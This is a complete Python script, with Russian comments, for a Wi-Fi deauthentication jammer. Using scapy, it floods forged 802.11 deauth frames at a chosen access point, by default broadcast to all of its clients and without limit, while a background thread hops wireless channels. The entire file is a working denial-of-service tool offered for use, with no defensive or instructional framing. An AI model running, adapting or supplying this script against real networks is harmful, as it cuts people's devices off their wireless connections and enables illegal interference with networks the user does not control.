#!/usr/bin/env python3
import argparse
from scapy.all import *
from threading import Thread
import time
import sys

def deauth_jammer(interface, target_bssid, client_bssid="FF:FF:FF:FF:FF:FF", count=0, interval=0.1):
    """
    Отправляет деаутентификационные пакеты для целевой сети
    interface: сетевой интерфейс в мониторном режиме (например, wlan0mon)
    target_bssid: MAC-адрес точки доступа
    client_bssid: MAC целевого клиента (по умолчанию широковещательный)
    count: количество пакетов (0 = бесконечно)
    interval: интервал между пакетами в секундах
    """
    dot11 = Dot11(addr1=client_bssid, addr2=target_bssid, addr3=target_bssid)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    
    sent_packets = 0
    try:
        while True:
            sendp(packet, iface=interface, verbose=False)
            sent_packets += 1
            if count != 0 and sent_packets >= count:
                break
            time.sleep(interval)
    except KeyboardInterrupt:
        print(f"\n[+] Отправлено пакетов: {sent_packets}")
    except Exception as e:
        print(f"[-] Ошибка: {e}")

def channel_hopper(interface, channels):
    """Переключает каналы беспроводного интерфейса"""
    while True:
        for channel in channels:
            os.system(f"iwconfig {interface} channel {channel}")
            time.sleep(0.5)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Wi-Fi Deauth Jammer")
    parser.add_argument("-i", "--interface", required=True, help="Мониторный интерфейс")
    parser.add_argument("-b", "--bssid", required=True, help="BSSID целевой сети")
    parser.add_argument("-c", "--client", default="FF:FF:FF:FF:FF:FF", help="MAC клиента")
    parser.add_argument("-n", "--count", type=int, default=0, help="Количество пакетов")
    parser.add_argument("-t", "--interval", type=float, default=0.1, help="Интервал отправки")
    parser.add_argument("--channels", nargs="+", type=int, default=[1,6,11], help="Каналы для переключения")
    
    args = parser.parse_args()
    
    print(f"[+] Запуск деаутентификации на интерфейсе {args.interface}")
    print(f"[+] Целевая сеть: {args.bssid}")
    print(f"[+] Целевой клиент: {args.client}")
    print("[+] Нажмите Ctrl+C для остановки")
    
    # Запуск переключения каналов
    hopper = Thread(target=channel_hopper, args=(args.interface, args.channels))
    hopper.daemon = True
    hopper.start()
    
    # Запуск глушителя
    deauth_jammer(args.interface, args.bssid, args.client, args.count, args.interval)